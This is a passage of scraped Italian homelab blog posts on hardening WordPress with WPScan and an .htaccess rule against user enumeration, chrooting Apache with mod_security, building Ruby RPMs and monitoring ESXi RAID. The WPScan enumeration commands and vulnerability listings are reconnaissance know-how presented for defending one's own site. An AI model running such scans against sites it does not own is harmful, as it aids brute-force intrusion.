questo aspetto, possiamo utilizzare il security scanner WPScan :\n[root@wpscan_test wpscan]# ./wpscan.rb --url http://www.example.it --enumerate u\r_______________________________________________________________\r__ _______ _____\r\\ \\ / / __ \\ / ____|\r\\ \\ /\\ / /| |__) | (___ ___ __ _ _ __\r\\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\\r\\ /\\ / | | ____) | (__| (_| | | | |\r\\/ \\/ |_| |_____/ \\___|\\__,_|_| |_|\rWordPress Security Scanner by the WPScan Team\rVersion v2.3r59131b6\rSponsored by the RandomStorm Open Source Initiative\r@_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_\r_______________________________________________________________\r[+] URL: http://www.example.it/\r[+] Started: Fri Apr 4 20:40:32 2014\r[+] Interesting header: SERVER: HTTP OK\r[+] XML-RPC Interface available under: http://www.example.it/xmlrpc.php\r[+] WordPress version 3.8.1 identified from meta generator\r[+] WordPress theme in use: k2 - v1.0.3\r| Name: k2 - v1.0.3\r| Location: http://www.example.it/wp-content/themes/k2/\r| Style URL: http://www.example.it/wp-content/themes/k2/style.css\r| Theme Name: K2\r| Theme URI: http://getk2.com\r| Description: \u0026lt;strong\u0026gt;\u0026lt;a href=\u0026#34;themes.php?page=k2-options\u0026#34;\u0026gt;Configure K2\u0026lt;/a\u0026gt;\u0026lt;/strong\u0026gt; or visit the \u0026lt;a href=\u0026#34;http...\r| Author: Various Artists\r| Author URI: http://getk2.com/\r[+] Enumerating plugins from passive detection ...\r| 1 plugins found:\r| Name: add-to-any - v1.2.9.2\r| Location: http://www.example.it/wp-content/plugins/add-to-any/\r| Readme: http://www.example.it/wp-content/plugins/add-to-any/README.txt\r[+] Enumerating usernames ...\r[+] Identified the following 1 user/s:\r+----+-------+-------------------+\r| Id | Login | Name |\r+----+-------+-------------------+\r| 1 | admin | Amministratore |\r+----+-------+-------------------+\r| 2 | pino2 | Scrittore Art. |\r+----+-------+-------------------+\r[+] Finished: Fri Apr 4 20:40:36 2014\r[+] Memory used: 1.305 MB\r[+] Elapsed time: 00:00:03\r[root@wpscan_test wpscan]# Come si può notare in pochi minuti è possibile avere l’intera lista degli utenti sotto gli occhi.\nQualcuno potrebbe obbiettare: “Si ok, ma le password non ci sono”.\nQuesto è vero, ma è vero anche che un male intenzionato partirebbe già avvantaggiato in un eventuale attacco di tipo bruteforce.\nPer chi ne fosse all’oscuro, il bruteforce è un attacco che si basa sui tantissimi tentativi di login con l’utilizzo di username e password casuali.\nEsistono tantissimi programmi che agiscono in questo modo in maniera autonoma fino a quando non trovano la combinazione giusta, quindi perchè avvantaggiare il cracker spiattegliandogli l’utente?\nPer tamponare questa vulnerabilità non c’è bisogno di alcun plugin ma soltanto di due regole di Rewrite scritte in un file .htacess all’interno della root directory del sito wordpress.\n\u0026lt;IfModule mod_rewrite.c\u0026gt;\rRewriteEngine On\rRewriteBase /\r# block user enumeration\rRewriteCond %{QUERY_STRING} (^|\u0026amp;)author=\rRewriteRule . http://%{SERVER_NAME}/? [L]\r\u0026lt;/IfModule\u0026gt; Creato il file .htaccess, testare nuovamente l’applicativo con WPScan:\n[root@wpscan_test wpscan]# ./wpscan.rb --url http://www.example.it --enumerate u\r_______________________________________________________________\r__ _______ _____\r\\ \\ / / __ \\ / ____|\r\\ \\ /\\ / /| |__) | (___ ___ __ _ _ __\r\\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\\r\\ /\\ / | | ____) | (__| (_| | | | |\r\\/ \\/ |_| |_____/ \\___|\\__,_|_| |_|\rWordPress Security Scanner by the WPScan Team\rVersion v2.3r59131b6\rSponsored by the RandomStorm Open Source Initiative\r@_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_\r_______________________________________________________________\r[+] URL: http://www.example.it/\r[+] Started: Fri Apr 4 20:39:19 2014\r[+] robots.txt available under: \u0026#39;http://www.example.it/robots.txt\u0026#39;\r[+] Interesting header: SERVER: HTTP OK\r[+] XML-RPC Interface available under: http://www.example.it/xmlrpc.php\r[+] WordPress version 3.8.1 identified from meta generator\r[+] WordPress theme in use: k2 - v1.0.3\r| Name: k2 - v1.0.3\r| Location: http://www.example.it/wp-content/themes/k2/\r| Style URL: http://www.example.it/wp-content/themes/k2/style.css\r| Theme Name: K2\r| Theme URI: http://getk2.com\r| Description: \u0026lt;strong\u0026gt;\u0026lt;a href=\u0026#34;themes.php?page=k2-options\u0026#34;\u0026gt;Configure K2\u0026lt;/a\u0026gt;\u0026lt;/strong\u0026gt; or visit the \u0026lt;a href=\u0026#34;http...\r| Author: Various Artists\r| Author URI: http://getk2.com/\r[+] Enumerating plugins from passive detection ...\r| 1 plugins found:\r| Name: add-to-any - v1.2.9.2\r| Location: http://www.example.it/wp-content/plugins/add-to-any/\r| Readme: http://www.example.it/wp-content/plugins/add-to-any/README.txt\r[+] Enumerating usernames ...\r[+] We did not enumerate any usernames\r[+] Finished: Fri Apr 4 20:39:26 2014\r[+] Memory used: 1.105 MB\r[+] Elapsed time: 00:00:07 Come si può notare dal risultato gli utenti non vengono più visualizzati.\nSe non dovesse funzionare, chiedere al gestore del proprio spazio web l’abilitazione all’utilizzo dei file .htaccess .\n","permalink":"https://www.homelab.it/index.php/2014/04/04/wordpress-security-nascondere-la-lista-utenti-da-occhi-indiscreti/","summary":"Installare e configurare wordpress è veramente semplice, soprattutto grazie al suo wizard user friendly.\nCome spesso accade però le configurazioni di default necessitanto di ritocchi.\nUna delle principali personalizzazioni da eseguire è quella di impedire la lettura degli utenti wordpress da remoto.\nPer testare l’importanza di questo aspetto, possiamo utilizzare il security scanner WPScan :\n[root@wpscan_test wpscan]# ./wpscan.rb --url http://www.example.it --enumerate u\r_______________________________________________________________\r__ _______ _____\r\\ \\ / / __ \\ / ____|\r\\ \\ /\\ / /| |__) | (___ ___ __ _ _ __\r\\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\\r\\ /\\ / | | ____) | (__| (_| | | | |\r\\/ \\/ |_| |_____/ \\___|\\__,_|_| |_|\rWordPress Security Scanner by the WPScan Team\rVersion v2.","title":"WordPress Security: Come nascondere la lista utenti"},{"content":"Wordpress ad oggi è la piattaforma CMS più diffusa al mondo, di conseguenza anche la più analizzata sotto l’aspetto della sicurezza.\nPer testare ed escludere la propria copia di wordpress da eventuali vulnerabilità note, è possibile utilizzare il software scanner WPScan.\nNel repository ufficiale CentOS non esiste il pacchetto precompilato di wpscan, quindi andrà scaricato e compilato manualmente.\nScenario e requisiti Ambiente di test\n Versione Linux: CentOS 6.5 (x86_64) Versione WPScan: 2.3  Prerequisiti ( dal sito ufficiale wpscan.org )\n Windows not supported Ruby \u0026gt;= 1.9.2 – Recommended: 1.9.3 Curl \u0026gt;= 7.21 – Recommended: latest – FYI the 7.29 has a segfault RubyGems – Recommended: latest Git   Installazione delle dipendenze =================================  WPScan è scritto con il linguaggio di scripting Ruby e necessita almeno della versione 1.9.2 .\nPer installare tale versione su CentOS, rimando al mio articolo raggiungibile da QUI.\nIl resto delle dipendenze possono essere installaretramite yum:\n[root@wpscan_test ~]# yum install gcc git ruby-devel libxml2 libxml2-devel libxslt libxslt-devel libcurl-devel git Installazione WPScan =======================  Tramite git scaricare l’ultima versione di WPScan:\n[root@wpscan_test ~]# git clone https://github.com/wpscanteam/wpscan.git\rInitialized empty Git repository in /root/wpscan/.git/\rremote: Reusing existing pack: 11357, done.\rremote: Total 11357 (delta 0), reused 0 (delta 0)\rReceiving objects: 100% (11357/11357), 7.88 MiB | 440 KiB/s, done.\rResolving deltas: 100% (6456/6456), done. Concluso il download, entrere nella directory e compilare il programma:\n[root@wpscan_test ~]# ls\rwpscan\r[root@wpscan_test ~]# cd wpscan/\r[root@wpscan_test wpscan]# gem install bundler \u0026amp;\u0026amp; bundle install --without test development\rFetching: bundler-1.6.1.gem (100%)\rSuccessfully installed bundler-1.6.1\r1 gem installed\rInstalling ri documentation for bundler-1.6.1...\rInstalling RDoc documentation for bundler-1.6.1...\rFetching gem metadata from https://rubygems.org/.........\rFetching additional metadata from https://rubygems.org/..\rResolving dependencies...\rInstalling ffi 1.9.3\rInstalling ethon 0.7.0\rInstalling json 1.8.1\rInstalling mini_portile 0.5.3\rInstalling nokogiri 1.6.1\rInstalling ruby-progressbar 1.4.2\rInstalling terminal-table 1.4.5\rInstalling typhoeus 0.6.8\rUsing bundler 1.6.1\rYour bundle is complete!\rGems in the groups test and development were not installed.\rUse `bundle show [gemname]` to see where a bundled gem is installed. Terminata la compilazione, testare il corretto funzionamento di wpscan:\n[root@wpscan_test wpscan]# ./wpscan.rb\r_______________________________________________________________\r__ _______ _____\r\\ \\ / / __ \\ / ____|\r\\ \\ /\\ / /| |__) | (___ ___ __ _ _ __\r\\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\\r\\ /\\ / | | ____) | (__| (_| | | | |\r\\/ \\/ |_| |_____/ \\___|\\__,_|_| |_|\rWordPress Security Scanner by the WPScan Team\rVersion v2.3r59131b6\rSponsored by the RandomStorm Open Source Initiative\r@_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_\r_______________________________________________________________\r....\r....\r.... Scansione con WPScan =======================  WPScan offre varie opzioni di scansione, da quelle invasive a quelle soltanto informative.\nDigitando il comando: “./wpscan.rb –help ” verrà stampata a video l’intera lista dei parametri con relativa descrizione.\nPer avere un quadro generale della propria piattaforma wordpress ed effettuare anche dei test di sicurezza, lo switch da utilizzare è: –url\n[root@wpscan_test wpscan]# ./wpscan.rb --url http://www.example.it\r_______________________________________________________________\r__ _______ _____\r\\ \\ / / __ \\ / ____|\r\\ \\ /\\ / /| |__) | (___ ___ __ _ _ __\r\\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\\r\\ /\\ / | | ____) | (__| (_| | | | |\r\\/ \\/ |_| |_____/ \\___|\\__,_|_| |_|\rWordPress Security Scanner by the WPScan Team\rVersion v2.3r59131b6\rSponsored by the RandomStorm Open Source Initiative\r@_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_\r_______________________________________________________________\r[+] URL: http://www.example.it/\r[+] Started: Fri Apr 4 14:24:44 2014\r[+] robots.txt available under: \u0026#39;http://www.example.it/robots.txt\u0026#39;\r[+] Interesting header: Apache/2.2.15 (Unix) DAV/2\r[+] XML-RPC Interface available under: http://www.example.it/xmlrpc.php\r[+] WordPress version 3.8.1 identified from meta generator\r[+] WordPress theme in use: k2 - v1.0.3\r| Name: k2 - v1.0.3\r| Location: http://www.example.it/wp-content/themes/k2/\r| Style URL: http://www.example.it/wp-content/themes/k2/style.css\r| Theme Name: K2\r| Theme URI: http://getk2.com\r| Description: \u0026lt;strong\u0026gt;\u0026lt;a href=\u0026#34;themes.php?page=k2-options\u0026#34;\u0026gt;Configure K2\u0026lt;/a\u0026gt;\u0026lt;/strong\u0026gt; or visit the \u0026lt;a href=\u0026#34;http...\r| Author: Various Artists\r| Author URI: http://getk2.com/\r[+] Enumerating plugins from passive detection ...\r| 1 plugins found:\r| Name: add-to-any - v1.2.9.2\r| Location: http://www.example.it/wp-content/plugins/add-to-any/\r| Readme: http://www.example.it/wp-content/plugins/add-to-any/README.txt\r[+] Finished: Fri Apr 4 14:24:52 2014\r[+] Memory used: 1.133 MB\r[+] Elapsed time: 00:00:07 In questo caso WPScan non rileva alcuna vurnerabilità conosciuta, ma mostra soltanto alcune informazioni tipo la versione di wordpress,il nome del tema,i plugins installati, il web server in cui risiede la piattaforma ecc… Quando lo scanner rileva qualche possibile vurnerabilità, oltre che segnalare il problema, fornisce gli url dei siti in cui è possibile approfondire le notizie sul bug ( e magari come installare una patch).\n[+] Enumerating plugins from passive detection ...\r| 5 plugins found:\r| Name: contact-form-7 - v3.7.2\r| Location:http://www.example.it/wp-content/plugins/contact-form-7/\r| Readme:http://www.example.it/wp-content/plugins/contact-form-7/readme.txt\r|\r| * Title: Contact Form 7 3.5.3 - Crafted File Extension Upload Remote Code Execution\r| * Reference: http://packetstormsecurity.com/files/125018/\r| * Reference: http://seclists.org/fulldisclosure/2014/Feb/0\r| * Reference: http://osvdb.org/102776\r| Name: jquery-slider-for-featured-content - v1.1\r| Location:http://www.example.it/wp-content/plugins/jquery-slider-for-featured-content/\r| Readme:http://www.example.it/wp-content/plugins/jquery-slider-for-featured-content/readme.txt\r| Name: leaguemanager - v3.8.8.1\r| Location:http://www.example.it/wp-content/plugins/leaguemanager/\r| Readme:http://www.example.it/wp-content/plugins/leaguemanager/readme.txt\r|\r| * Title: LeagueManager \u0026lt;= 3.7 - wp-admin/admin.php Multiple Parameter XSS\r| * Reference: http://packetstormsecurity.com/files/112698/\r| * Reference: http://www.securityfocus.com/bid/53525\r| * Reference: http://xforce.iss.net/xforce/xfdb/75629\r| * Reference: http://secunia.com/advisories/49949\r| * Reference: http://osvdb.org/82266\r|\r| * Title: LeagueManager 3.8 - SQL Injection\r| * Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-1852\r| * Reference: http://osvdb.org/91442\r| * Reference: http://www.exploit-db.com/exploits/24789/ Schedulazione scan ed invio report tramite e-mail ====================================================  Per schedulare una scansione automatica del proprio sito wordpress, basta creare uno semplice script da eseguire tramite il demone cron.\nPonendo il caso di voler effettuare una scansione settimanale, si deve creare il file “/etc/cron.weekly/wpscan” ed al suo interno scrivere:\n#!/bin/sh\r# Directory installazione WPScan\rwpsdir=\u0026#34;/root/wpscan\u0026#34;\r# Url sito wordpress\rwpurl=\u0026#34;http://www.example.it\u0026#34;\r# Generatore data/ora stile: HH:mm dd/mm/YYYY\rdata=$(date \u0026#34;+%H:%M %d/%m/%Y\u0026#34;)\r# Indirizzo e-mail destinatario report\remail=\u0026#34;tua@email.it\u0026#34;\r# Entra nella directory di wpscan\rcd $wpsdir\r# Aggiorna database vurnerabilita\u0026#39; WPScan\rruby wpscan.rb --update\r# Esegui WPScan ed invia report per e-mail\rruby wpscan.rb --url $wpurl | mail -s \u0026#34;WPScan Report $data\u0026#34; $email Per concludere la procedura, rendere eseguibile lo script:\n[root@wpscan_test wpscan]# chmod +x /etc/cron.weekly/wpscan\n","permalink":"https://www.homelab.it/index.php/2014/04/04/wordpress-security-come-installare-wpscan-su-centos-6-schedulare-scansioni-ed-inviare-report-tramite-e-mail/","summary":"Wordpress ad oggi è la piattaforma CMS più diffusa al mondo, di conseguenza anche la più analizzata sotto l’aspetto della sicurezza.\nPer testare ed escludere la propria copia di wordpress da eventuali vulnerabilità note, è possibile utilizzare il software scanner WPScan.\nNel repository ufficiale CentOS non esiste il pacchetto precompilato di wpscan, quindi andrà scaricato e compilato manualmente.\nScenario e requisiti Ambiente di test\n Versione Linux: CentOS 6.5 (x86_64) Versione WPScan: 2.","title":"WordPress Security: Come installare WPScan su CentOS 6"},{"content":"Obbiettivo Installare su CentOS 6.x la versione 1.9.x del linguaggio di programmazione Ruby.\nScenario  Server Linux: CentOS 6.5 (x86_64) Repo Ruby: ruby-1.8.7.352-13.el6.x86_64.rpm New Ruby: ruby-1.9.3p545-1.el6.x86_64.rpm  Collegarsi con utenza root alla shell/terminale ed eseguire i seguenti comandi:\n# Creazione ambiente per la compilazione del pacchetto rpm\rmkdir -p rpmbuild/{BUILD,BUILDROOT,RPMS,SOURCES,SPECS,SRPMS}\r# Download ultima versione Ruby e file spec per la compilazione\rwget http://ftp.ruby-lang.org/pub/ruby/1.9/ruby-1.9.3-p545.tar.gz -P rpmbuild/SOURCES\rwget https://raw.github.com/imeyer/ruby-1.9.3-rpm/master/ruby19.spec -P rpmbuild/SPECS\r# Modificare file spec per la versione appena scaricata du ruby (1.9.3-p545)\reditare il file rpmbuild/SPECS/ruby19.spec e modificare la riga\r\u0026#34;%define rubyminorver p484\u0026#34; in \u0026#34;%define rubyminorver p545\u0026#34;\r# Scaricare pacchetti che fanno parte delle dipendenze di Ruby (tramite yum)\ryum readline libyaml libyaml-devel readline-devel ncurses ncurses-devel gdbm gdbm-devel \\\rglibc-devel tcl-devel gcc unzip openssl-devel db4-devel byacc make libffi-devel\r# Scaricare, se necessario, il pacchetto per compilare gli rpms - rpm-build -\ryum rpm-build\r# Eeseguire rpm-build ed attendere la fine della compilazione...\r# questa tempistica varierà dalle prestrazioni della propria macchina\rrpmbuild -bb rpmbuild/SPECS/ruby19.spec\r# Conclusa la compilazione, installare il pacchetto rpm # (sostituire x86_64 con i386/i586/i686/ in caso di sistema a 32bit)\rrpm -Uvh rpmbuild/RPMS/x86_64/ruby-1.9.3p545-1.el6.x86_64.rpm # Eseguire Ruby per visualizzare il numero versione\r[root@rubytest ~]# ruby -v\rruby 1.9.3p545 (2014-02-24 revision 45159) [x86_64-linux] Se tutto è andato a buon fine salvarsi il pacchetto rpm ed eliminare la directory rpmbuild precedentemente creata.\n","permalink":"https://www.homelab.it/index.php/2014/04/03/installare-ruby-1-9-x-su-centos-6/","summary":"Obbiettivo Installare su CentOS 6.x la versione 1.9.x del linguaggio di programmazione Ruby.\nScenario  Server Linux: CentOS 6.5 (x86_64) Repo Ruby: ruby-1.8.7.352-13.el6.x86_64.rpm New Ruby: ruby-1.9.3p545-1.el6.x86_64.rpm  Collegarsi con utenza root alla shell/terminale ed eseguire i seguenti comandi:\n# Creazione ambiente per la compilazione del pacchetto rpm\rmkdir -p rpmbuild/{BUILD,BUILDROOT,RPMS,SOURCES,SPECS,SRPMS}\r# Download ultima versione Ruby e file spec per la compilazione\rwget http://ftp.ruby-lang.org/pub/ruby/1.9/ruby-1.9.3-p545.tar.gz -P rpmbuild/SOURCES\rwget https://raw.github.com/imeyer/ruby-1.9.3-rpm/master/ruby19.spec -P rpmbuild/SPECS\r# Modificare file spec per la versione appena scaricata du ruby (1.","title":"Installare Ruby 1.9.x su CentOS 6"},{"content":"\nObbiettivo Configurare il server web Apache 2.x isolato in ambiente chroot tramite il web firewall applicativo MODSECURITY .\nScenario  Server Linux: CentOS 6.5 Server Apache: httpd-2.2.15-29 modsecurity: mod_security-2.7.3-2 Php Version: php-5.3.3-27 Directory root Chroot: (/web) Selinux: NO   Installazione dei pacchetti necessari per modsecurity ========================================================  Da utente root scaricare l’ultima versione del repository EPEL , dopo di che installare i programmi necessari tramite YUM:\n wget http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm rpm -Uhv epel-release-6-8.noarch.rpm yum install mod_security  yum install httpd php (solo se necessario)  Creazione ambiente chroot Per prima cosa creare le directory di sistema che ospiteranno apache:\n mkdir /web/ mkdir -p /web/var/run/httpd/ mkdir -p /web/var/www/html/ mkdir -p /web/etc/httpd mkdir /web/tmp mkdir -p /web/var/lib/php/session/ mkdir -p /web/usr/share/zoneinfo/ **mkdir /web/lib64/\n** mkdir -p /web/var/lock/subsys/ cp -p /etc/localtime /web/etc/ cp -p /etc/resolv.conf /web/etc/ cp -p /etc/hosts /web/etc/ cp -prf /usr/share/zoneinfo/* /web/usr/share/zoneinfo/ **cp -p /lib64/libnss_dns.so.2 /web/lib64/\n** cd /web/etc/httpd/ ln -s ../../var/run/httpd run  ATTENZIONE – In caso di sistemi a 32bit sostituire “lib64” con “lib“, solo nei punti 8 e 14 sopra citati.\nConclusa la creazione delle directory, settare i permessi di sistema in maniera appropriata (in accordo con i settaggi di default):\n chmod 0555 /web chmod 0755 /web/etc chmod 0755 /web/etc/httpd chmod 0555 /web/lib64 chmod 0777 /web/tmp chmod 0755 /web/var/lib chmod 0755 /web/var/lib/php chown apache.apache /web/var/lib/php/session chmod 0770 /web/var/lib/php/session chmod 0755 /web/var/run chown root.apache /web/var/run/httpd/ chmod 0710 /web/var/run/httpd/ chmod 0755 /web/var/www/ chown apache.apache /web/var/www/html/ chmod 0770 /web/var/www/html/  Configurazione modsecurity Da root editare il file /etc/httpd/conf.d/mod_security.conf .\nModificare le ultime righe da così:\nSecCookieFormat 0 SecUploadDir /var/lib/mod_security SecDataDir /var/lib/mod_security \u0026lt;/IfModule\u0026gt; a così:\nSecChrootDir /web SecTmpDir /tmp SecUploadDir /tmp SecDataDir /var/lib/mod_security \u0026lt;/IfModule\u0026gt; Configurazione init file di Apache Modificare il file init di apache in modo da poter gestire il file pid del processo all’interno dell’ambiente chroot.\nSostiruire le righe file /etc/init.d/httpd da così:\npidfile=${PIDFILE-/web/var/run/httpd/httpd.pid} lockfile=${LOCKFILE-/web/var/lock/subsys/httpd} a così:\n# Cambio destinazione dei file verso ambiente chroot #pidfile=${PIDFILE-/var/run/httpd/httpd.pid} #lockfile=${LOCKFILE-/var/lock/subsys/httpd} pidfile=${PIDFILE-/web/var/run/httpd/httpd.pid} lockfile=${LOCKFILE-/web/var/lock/subsys/httpd} Avvio di apache e test funzionamento ambiente chroot Far paritire il servizio apache:\n[root@apache02 ~]# /etc/init.d/httpd start Avvio di httpd: [ OK ] [root@apache02 ~]# Adesso che il demone è attivo, creare la pagina php “/web/var/www/html/index.php” tramite l’editor preferito:\n\u0026lt;?php $file = \u0026#34;/tmp/file.txt\u0026#34;; $f = fopen($file, \u0026#34;r\u0026#34;); while ( $line = fgets($f, 1000) ) { print $line; } Creare due file temporanei di test e settare i permessi appropriati:\n# Cambio propetario della pagina php chown apache.apache /web/var/www/html/index.php # Creo due file di testo all interno delle directory temp echo “Filesystem ROOT” \u0026gt; /tmp/file.txt echo “Filesystem CHROOT” \u0026gt; /web/tmp/file.txt # Cambio permessi dei file temporanei chmod 777 /tmp/file.txt chmod 777 /web/tmp/file.txt Lo scopo di questo test è accertarsi che apache non esca dall’ambiente isolato chroot.\nLa pagina php precedentemente creata andrà ad aprire il file “/tmp/file.txt” e se modsecurity è stato configurato in maniera corretta, apache leggerà il file all’interno della directory temporanea stampando sul browser: Filesystem CHROOT.\nProblema logrotate Logrotate, dopo aver ruotato i vecchi log di apache, esegue il comando “/etc/init.d/httpd reload“.\nPurtroppo a causa delle modifiche apportate alll’init script di apache per modsecurity, l’operazione di reload non va più a buon fine.\nIl processo di apache viene stoppato correttamente, ma al momento dell’avvio si blocca (Oblligando un’inizializzazione del servizio manuale).\nL’unico workaround che ho trovato è quello di modificare il file “/etc/logrotate.d/httpd” da così:\n/var/log/httpd/*log { missingok compress notifempty sharedscripts delaycompress postrotate /sbin/service httpd reload \u0026gt; /dev/null 2\u0026gt;/dev/null || true endscript } a così:\n/var/log/httpd/*log { missingok compress notifempty sharedscripts delaycompress postrotate /sbin/service httpd restart \u0026gt; /dev/null 2\u0026gt;/dev/null || true endscript } Mi sento di sconsigliare questo workaround per ambienti di produzione.\nAppena avrò novità aggiornerò il post.\n","permalink":"https://www.homelab.it/index.php/2014/04/02/apache-2-chroot-modsecurity-centos-6/","summary":"Obbiettivo Configurare il server web Apache 2.x isolato in ambiente chroot tramite il web firewall applicativo MODSECURITY .\nScenario  Server Linux: CentOS 6.5 Server Apache: httpd-2.2.15-29 modsecurity: mod_security-2.7.3-2 Php Version: php-5.3.3-27 Directory root Chroot: (/web) Selinux: NO   Installazione dei pacchetti necessari per modsecurity ========================================================  Da utente root scaricare l’ultima versione del repository EPEL , dopo di che installare i programmi necessari tramite YUM:\n wget http://dl.","title":"Apache 2 chroot + modsecurity CentOS 6"},{"content":"Nella creazione di un buon home lab esxi non può mancare un controller raid che gestisca i dischi del datastore.\nLa mia scelta è riacduta sul controller IBM M5014 equvialente al LSI MegaRAID 9260-8i.\nUna volta configurato il raid e installato il datastore per il mio ESXi 5.5, la prima domanda è stata:\nE adesso come faccio a monitorare lo stato del controller e dei dischi?\nCollegare il controller raid in passthrough a una virtual machine non è possibile dato che esxi perderebbe la connesione al Datastore.\n\nLa soluzione viene proposta direttamente da LSI Corporation.\nSul sito www.lsi.com , nella sezione support, è disponibile il software MegaRAID Storage Manager da installare sul proprio pc e VMWare SMIS Provider da installare sull’host ESXi.\n\nPer il Manager utilizzerò un pc Windows 7:\n\nPer SMIS provider invece:\n\nAdesso che abbiamo tutto l’occorrente ricapitolo la mia configurazione e cominciamo la procedura.\nPC client: Windows 7 (x64)\nESXi: 5.5\nLSI MegaRAID Storage Manager (MSM): 13.11.01.00\nMegaRAID SMIS Providers: MR 6.2\nNetworkig\nProcedura:  Configurazione del servizio SSH su ESXi   Questo punto può essere saltato se SSH è già attivo o se si preferisce copiare il file VIB SMIS tramite browser del Datastore (vSphere Client)\nTrasferimento del file VIB su ESXi   Tramite un client scp selezionare il file VIB SMIS Providers _(vmware-esx-provider-lsiprovider.vib)\n_che si trova all’interno del file zip precedentemente scaricato e copiarlo nella directory /tmp del virtualizzatore.\nIn alternativa è possibile copiare il file vib tramite browser del Datastore (vSphere Client)\nInstallazione del MegaRAID SMIS Providers   ATTENZIONE – Il centro supporto di LSI Corporation consiglia di configurare ESXi in “Maintenance Mode”\nprima di installare SMIS Providers, quindi sospendere o spengere tutte le macchine virtuali prima di entrare in tale modalità.\nTramite un client ssh collegarsi alla shell del virtualizzatore, e dopo aver inserito login e password digitare:\n~ # cd /tmp\n/tmp # esxcli software vib install -v vmware-esx-provider-lsiprovider.vib –no-sig-check\nSe abbiamo optato precedentemente per l’upload del vib file tramite vSphere client digitare:\n~ # esxcli software vib install −v /vmfs/volumes/[datastore]/[dir]/vmware-esx-provider-lsiprovider.vib −−no−sig−check\nFinita l’installazione è obbligatorio eseguire un riavvio di ESXi, quindi uscire dalla modalità Maintenance e far ripartire tutte le virtual machines.\nSe tutto è andato a buon fine nel tab “Configuration” dell’host ESXi vedremo i sensori dello storage configurati:\n\nInstallazione LSI MegaRAID Storage Manager (MSM)   Per l’installazione di MSM non c’è da seguire nessuna procedura particolare, è consigliabile selezionare la tipologia d’installazione Completa.\nDeclinare la richiesta d’utilizzo di account LDAP.\n\nNella successiva schermata, cliccare sul bottone “Finish” per concludere l’installazione\nA questo punto troveremo sul dekstop l’icona del Manager:\n.\nRisoluzione hosts ESXi e pc client   Questo punto è fondamentale per la buona riuscita del collegamento MSM -\u0026gt; SMIS Providers .\nLo scopo è quello di far risolvere gli host dell’esxi al pc client e viceversa.\nImmaginiamo uno scenario come questo:\nPC client – IP: 10.0.0.64 Host: NBH24.homelab.local\nESXi: 5.5 – IP: 10.0.0.3 Host: esxi01.homelab.local\nVcenter 5.5 – IP: 10.0.0.5 Host: vcenter.homelab.local (Opzionale)\nPer il pc windows basta editare il file C:\\Windows\\System32\\drivers\\etc\\hosts e configurarlo così:\n\nPer il VMware ESXi tramite un client ssh collegarsi alla shell, e dopo aver inserito login e password digitare:\n~ # vi /etc/hosts\nuna volta editato il file con vi, modificarlo in questo modo:\n# Do not remove the following line, or various programs\n# that require network functionality will fail.\n127.0.0.1 localhost.localdomain localhost\n::1 localhost.localdomain localhost\n10.0.0.3 esxi01.homelab.local esxi01\n10.0.0.5 vcenter.homelab.local vcenter\n10.0.0.64 nbh24.homelab.local nbh24\nPer controllare che tutto sia andato a buon fine, provare a scambiare dei ping inserendo come destinazione l’host invece che l’ip.\nConfigurazone SLP Helper multicast-to-unicast proxy   MSM Manager inoltra il traffico dati in modalità multicast mentre il servizio CIM Providers (servizi monitor Hardware) di ESXi col classico unicast.\nPer ovviare a questa incompatibilità basta utilizzare un proxy multicast-unicast scritto in php da `Alex/AT` scaricabile da qui.\nQuesta piccola utility dovrà essere eseguita, tutte le volte, prima del MegaRAID Storage Manager\nLa configurazione è semplice, dopo aver scompattao il file zip entrare nella directory e:\n editare il file slp_helper.php cercare la riga del file $unicast_ips = array(‘192.168.1.1’); sostituire l’ip con quello del proprio ESXi, nel mio caso $unicast_ips = array(‘10.0.0.3’);  L’eseguzione dello script è banale, basta cliccare con il tasto destro sul batch file runme.cmd ed eseguirlo come Amministratore.\n\nConfigurazione MegaRAID Storage Manager   Finalmente siamo arrivati alla fase finale.\nEseguire il programma MSM cliccando sull’icona sul deskstop.\n\nAperto il programma, cliccare il bottone sulla destra “Configure Host”\n\nNella nuova finestra, selezionare l’opzione “Dispaly all ESXi-CIMOM servers in the network of local server”\n\nPremere il tasto “Save Setting” e confermare\n\nA questo punto partirà automaticamente la scansione di rete alla ricerca dell’ESXi host, e se è andato tutto bene visualizzeremo:\n\nCliccare sull’ip dell’host ESXi, inserire l’utente root con relativa password ed il gioco è fatto:\n\n","permalink":"https://www.homelab.it/index.php/2014/03/28/monitorare-stato-controller-raid-megaraid-lsi-92xx-datastore-esxi-5-x/","summary":"Nella creazione di un buon home lab esxi non può mancare un controller raid che gestisca i dischi del datastore.\nLa mia scelta è riacduta sul controller IBM M5014 equvialente al LSI MegaRAID 9260-8i.\nUna volta configurato il raid e installato il datastore per il mio ESXi 5.5, la prima domanda è stata:\nE adesso come faccio a monitorare lo stato del controller e dei dischi?\nCollegare il controller raid in passthrough a una virtual machine non è possibile dato che esxi perderebbe la connesione al Datastore.","title":"Monitorare controller RAID MegaRAID LSI 92xx su ESXi 5.x (Datastore version)"},{"content":"\nPer studiare il funzionamento dell’ambiente virtuale VMware, mi sono assemblato un virtualizzatore con Hardware di comune utilizzo (Whitebox).\nSe anche voi siete alla ricerca di hardware compatibile per creare il vostro ESXi server potrete prendere spunto dalla mia configurazione.\nLista hardware whitebox esxi 5.5 IMMO Motherboard: Asrock 970 Extreme3 R2.0\nCPU: AMD FX 8350\nRAM: Corsair 32GB DDR3-1600MHz Vengeance Pro_(4x8GB)\nPSU: Seasonic S12II-520 Bronze\nDatastore Storage: 4 x 1TB Seagate ST1000DM003 Barracuda\nESXi Sorage: Kingston Technology 8GB USB 3.0 DataTraveler I G4 (Ho installato esxi su una pendriveve)\nController Raid: LSI MegaRAID 9260-8i 256 Mb Cache (Controller Raid SATA3 configurato in RAID10)\nVga: Sapphire Hd5450 Hm Pci-E (nella mia scheda madre non è presente una scheda vga a bordo)\nDual Ethernet: Delock PCI Express Card 